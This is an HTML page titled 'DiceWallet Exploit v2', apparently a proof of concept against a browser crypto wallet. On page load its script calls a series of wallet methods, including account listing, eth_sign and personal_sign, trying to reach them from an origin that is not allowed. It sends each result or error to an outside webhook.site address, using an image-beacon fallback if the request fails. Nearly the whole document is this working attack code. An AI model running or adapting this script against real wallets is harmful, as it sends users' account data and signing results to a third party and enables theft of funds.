<!DOCTYPE html>
<html>
<head>
    <title>DiceWallet Exploit v2</title>
</head>
<body>
    <h1>DiceWallet Exploit</h1>
    <div id="status"></div>
    
    <script>
        const WEBHOOK_URL = 'https://e12d2551-e904-4c69-afb6-790abe2d8f6b.webhook.site';
        
        function log(msg) {
            document.getElementById('status').innerHTML += '<br>' + msg;
            console.log(msg);
        }
        
        function sendToWebhook(data) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(() => {
                // Fallback to image if fetch fails
                new Image().src = `${WEBHOOK_URL}?data=${encodeURIComponent(JSON.stringify(data))}`;
            });
        }
        
        async function exploit() {
            log('1. Waiting for ethereum provider...');
            
            await new Promise(resolve => {
                if (window.ethereum) {
                    resolve();
                } else {
                    window.addEventListener('dwOnReady', resolve, { once: true });
                    setTimeout(resolve, 5000);
                }
            });
            
            if (!window.ethereum) {
                log('❌ No ethereum provider');
                return;
            }
            
            log('2. Ethereum provider ready!');
            
            // Danh sách methods cần test
            const methods = [
                // Basic
                'eth_chainId',
                'eth_accounts',
                'net_version',
                'eth_blockNumber',
                
                // Wallet specific
                'wallet_getState',
                'wallet_getAccounts',
                'wallet_getCurrentAccount',
                
                // Try to get info without allowed origin
                'personal_sign',
                'eth_sign',
                'eth_signTypedData',
                'eth_signTypedData_v3',
                'eth_signTypedData_v4',
                
                // Maybe these work?
                'wallet_exportPublicKey',
                'wallet_exportAddress',
                'wallet_getBalance'
            ];
            
            log('3. Testing methods...');
            
            for (const method of methods) {
                try {
                    log(`Testing ${method}...`);
                    const result = await window.ethereum.request({ method });
                    log(`✅ ${method}:`, result);
                    
                    sendToWebhook({
                        type: 'method_success',
                        method,
                        result
                    });
                    
                } catch (e) {
                    log(`❌ ${method}: ${e.message}`);
                    
                    sendToWebhook({
                        type: 'method_error',
                        method,
                        error: e.message
                    });
                }
                
                // Delay giữa các request
                await new Promise(r => setTimeout(r, 500));
            }
            
            log('=== Exploit Complete ===');
        }
        
        log('0. Starting exploit...');
        exploit();
    </script>
</body>
</html>
